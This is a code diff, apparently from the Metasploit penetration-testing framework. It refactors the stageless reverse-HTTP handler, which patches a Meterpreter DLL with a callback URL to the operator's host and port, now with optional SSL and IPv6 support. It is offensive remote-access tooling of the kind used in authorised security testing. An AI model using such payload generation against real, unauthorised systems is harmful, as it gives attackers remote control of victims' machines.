@@ -26,35 +26,32 @@ module Handler::ReverseHttp::Stageless
     ], self.class)
   end
 
-  def generate_stageless(&block)
-    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}#{generate_uri_uuid_mode(:connect)}/"
-
-    unless block_given?
-      raise ArgumentError, "Stageless generation requires a block argument"
+  def generate_stageless(opts={})
+    unless opts[:generator]
+      raise ArgumentError, "Stageless generation requires a generator argument"
     end
 
+    if opts[:ssl].nil?
+      raise ArgumentError, "Stageless generation requires an ssl argument"
+    end
+
+    host = datastore['LHOST']
+    host = "[#{host}]" if Rex::Socket.is_ipv6?(host)
+    url = "http#{opts[:ssl] ? "s" : ""}://#{host}:#{datastore['LPORT']}"
+    url << "#{generate_uri_uuid_mode(:connect)}/"
+
     # invoke the given function to generate the architecture specific payload
-    block.call(url) do |dll|
+    opts[:generator].call(url) do |dll|
 
-      # TODO: figure out this bit
-      # patch the target ID into the URI if specified
-      #if opts[:target_id]
-      #  i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
-      #  if i
-      #    t = opts[:target_id].to_s
-      #    raise "Target ID must be less than 5 bytes" if t.length > 4
-      #    u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
-      #    print_status("Patching Target ID #{t} into DLL")
-      #    dll[i, u.length] = u
-      #  end
-      #end
-
-      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
-                                           datastore['HandlerSSLCert'])
+      verify_cert_hash = nil
+      if opts[:ssl]
+        verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                             datastore['HandlerSSLCert'])
+      end
 
       Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
         :url           => url,
-        :ssl           => true,
+        :ssl           => opts[:ssl],
         :ssl_cert_hash => verify_cert_hash,
         :expiration    => datastore['SessionExpirationTimeout'].to_i,
         :comm_timeout  => datastore['SessionCommunicationTimeout'].to_i,
